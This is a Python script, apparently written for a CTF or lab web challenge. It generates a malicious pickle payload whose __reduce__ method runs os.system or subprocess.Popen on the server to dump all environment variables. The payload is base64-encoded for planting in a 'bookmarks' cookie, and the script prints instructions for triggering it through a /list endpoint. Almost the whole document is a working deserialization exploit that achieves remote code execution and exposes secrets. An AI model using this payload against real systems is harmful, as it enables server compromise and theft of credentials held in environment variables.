import pickle
import base64
import os

# Create a class that uses __reduce__ to execute code when unpickled
class Exploit:
    def __reduce__(self):
        # Return a tuple of (callable, args) that will be executed during unpickling
        # Using os.environ to get all environment variables and format them
        return (os.system, ("python -c 'import os, json; print(\"---ENV_VARS_START---\"); print(json.dumps(dict(os.environ), indent=2)); print(\"---ENV_VARS_END---\")'",))

# Alternative: More direct approach using subprocess to exfiltrate data
class Exploit2:
    def __reduce__(self):
        import subprocess
        # Execute command to get environment variables
        cmd = "python -c 'import os; [print(f\"{k}={v}\") for k,v in os.environ.items()]'"
        return (subprocess.Popen, (cmd,))

# Create the exploit object
exploit = Exploit()

# Serialize it using pickle
pickle_data = pickle.dumps(exploit)

# Encode to base64 for cookie transmission
encoded_payload = base64.b64encode(pickle_data).decode()

print("=" * 70)
print("PICKLE DESERIALIZATION EXPLOIT PAYLOAD")
print("=" * 70)
print(f"\n[+] Original 'bookmarks' cookie value: gARdlC4=")
print(f"[+] This is a base64-encoded pickle that likely contains a list or dict")
print(f"[+] Our payload will replace it with malicious pickle code\n")

print("=" * 70)
print("PAYLOAD GENERATION CODE")
print("=" * 70)
print("""
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        # This tuple (callable, args) is executed when pickle.loads() is called
        return (os.system, (
            "python -c 'import os, json; "
            "print(\"---ENV_VARS_START---\"); "
            "print(json.dumps(dict(os.environ), indent=2)); "
            "print(\"---ENV_VARS_END---\")'",
        ))

# Create and encode the exploit
exploit = Exploit()
pickle_data = pickle.dumps(exploit)
encoded_payload = base64.b64encode(pickle_data).decode()
""")

print("\n" + "=" * 70)
print("FINAL BASE64-ENCODED PAYLOAD")
print("=" * 70)
print(f"\n{encoded_payload}\n")

print("=" * 70)
print("HOW IT WORKS")
print("=" * 70)
print("""
1. __reduce__ method:
   - When pickle deserializes an object, it looks for __reduce__ method
   - __reduce__ returns a tuple (callable, args) that gets executed
   - This is a legitimate pickle feature for reconstructing objects

2. Code execution:
   - We override __reduce__ to return (os.system, (command,))
   - When pickle.loads() runs, os.system(command) executes
   - This allows arbitrary code execution on the server

3. The command:
   - Runs a Python one-liner that imports os and json
   - Iterates through all environment variables via os.environ
   - Formats output with clear start/end markers
   - Prints in JSON format for easy parsing

4. Base64 encoding:
   - Pickle data is binary and contains null bytes
   - Base64 encoding makes it safe for cookie storage
   - Can be directly placed in the 'bookmarks' cookie

5. Triggering the exploit:
   - Set the 'bookmarks' cookie to this payload
   - Visit the /list endpoint (or any endpoint that deserializes the cookie)
   - The server will execute pickle.loads(base64.b64decode(cookie_value))
   - Our malicious code runs and prints environment variables
   - Look for the output in the HTTP response or server logs
""")

# Show a preview of what the serialized data looks like
print("\n" + "=" * 70)
print("PICKLE SERIALIZATION DETAILS")
print("=" * 70)
print(f"\n[+] Raw pickle data (first 100 bytes): {pickle_data[:100]}")
print(f"[+] Encoded payload length: {len(encoded_payload)} characters")
print(f"[+] Example of injection: bookmarks={encoded_payload[:50]}...")

